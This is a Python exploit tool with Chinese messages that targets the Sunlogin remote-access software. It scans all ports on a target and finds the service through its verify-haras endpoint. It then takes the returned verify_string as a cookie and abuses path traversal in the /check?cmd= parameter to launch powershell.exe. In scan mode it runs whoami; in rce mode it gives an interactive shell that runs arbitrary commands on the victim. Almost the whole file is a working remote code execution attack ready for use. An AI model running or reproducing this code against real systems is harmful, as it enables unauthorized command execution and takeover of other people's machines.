# -*- coding: utf-8 -*-
# @Author  : AD钙奶
import json
import socket
import sys
from datetime import datetime
from multiprocessing.dummy import Pool as ThreadPool

import argparse
import requests
# https://www.jb51.net/article/219526.htm
port_list = []

class ScanPort:
	def __init__(self,ip):
		self._ip = ip
		self.ip = None

	def scan_port(self, port):
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			res = s.connect_ex((self.ip, port))
			if res == 0:
				print('Ip:{} Port:{} IS OPEN'.format(self.ip, port))
				port_list.append(port)
		except Exception as e:
			print(e)
		finally:
			s.close()

	def start(self):
		remote_server = self._ip
		self.ip = socket.gethostbyname(remote_server)
		ports = [i for i in range(1, 65535)]
		socket.setdefaulttimeout(0.5)
		t1 = datetime.now()
		threads = []
		pool = ThreadPool(processes=1000)
		pool.map(self.scan_port, ports)
		pool.close()
		pool.join()
		print('[ * ] 端口扫描已完成，耗时：', datetime.now() - t1)



def _POC(ip):
	for ports in port_list:
		url = "http://" + ip + ":" + str(ports) + "/cgi-bin/rpc?action=verify-haras"
		try:
			req = requests.get(url,verify=False,timeout=1).text
			if "verify_string" in req:
				ips = ip + ":" + str(ports)
				print("[ * ] 发现向日葵端口: " + ips)
				_Rce(ips)
				exit(1)
		except Exception as e:
			pass


def _Rce(urls):
	try:
		headers = {
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",
			"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			"Accept-Encoding": "gzip, deflate",
			"Accept-Language": "zh-CN,zh;q=0.9"
		}
		proxy = '127.0.0.1:8080'
		proxies = {
			"http": "http://" + proxy,
			"https": "https://" + proxy,
		}
		url = 'http://' + urls + '/cgi-bin/rpc?action=verify-haras'
		req = requests.get(url, headers=headers, verify=False)
		if req.status_code == 200:
			verify_string = json.loads(req.text)['verify_string']
			headers2 = {
				"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",
				"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"Accept-Encoding": "gzip, deflate",
				"Accept-Language": "zh-CN,zh;q=0.9",
				"Cookie": "CID ="  + verify_string
			}
			poc2 = 'http://' + urls + '/check?cmd=ping../../../windows/system32/windowspowershell/v1.0/powershell.exe+whoami'
			rec2 = requests.get(poc2, headers=headers2, verify=False)
			if rec2.status_code == 200:
				print('[ * ] 存在漏洞 ' + urls + '------' + rec2.text)
	except Exception as e:
		print(e)
		pass


def _verify(urls):
	headers = {
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"Accept-Encoding": "gzip, deflate",
		"Accept-Language": "zh-CN,zh;q=0.9"
	}
	proxy = '127.0.0.1:8080'
	proxies = {
		"http": "http://" + proxy,
		"https": "https://" + proxy,
	}
	url = 'http://' + urls + '/cgi-bin/rpc?action=verify-haras'
	req = requests.get(url, headers=headers, verify=False)
	if req.status_code == 200:
		verify_string = json.loads(req.text)['verify_string']
		while True:
			try:
				headers2 = {
					"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",
					"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
					"Accept-Encoding": "gzip, deflate",
					"Accept-Language": "zh-CN,zh;q=0.9",
					"Cookie": "CID =" + verify_string
				}
				command = str(input("[+] 请输出需要执行的命令："))
				if len(command) > 1 and "exit" not in command:
					poc2 = 'http://' + urls + f'/check?cmd=ping../../../windows/system32/windowspowershell/v1.0/powershell.exe+{command}'
					# print(verify_string)
					rec2 = requests.get(poc2, headers=headers2, verify=False)
					if rec2.status_code == 200:
						rec2.encoding = "gb2312"
						print(rec2.text)
				elif command == "exit":
					exit()
			except KeyboardInterrupt:
				exit()




def init_command_args():
	parser = argparse.ArgumentParser()
	parser.add_argument('-u', '--target', help='请输入目标地址', metavar='')
	parser.add_argument('-p', '--port', help="请输入目标端口", metavar='')
	parser.add_argument('--scan', action="store_true", help='漏洞扫描模式')
	parser.add_argument('--rce', action="store_true", help='漏洞验证模式')
	if len(sys.argv) == 1:
		parser.print_help()
		sys.exit(1)
	args = parser.parse_args()
	return args



def main():
	args = init_command_args()
	url = args.target
	rce = args.rce
	port = args.port
	scan = args.scan
	if scan:
		ScanPort(url).start()
		_POC(url)
	elif rce:
		if url and port:
			ip = url + ":" + port
			_verify(ip)
		else:
			print("请输出目标的端口和地址")


if __name__ == '__main__':
	main()
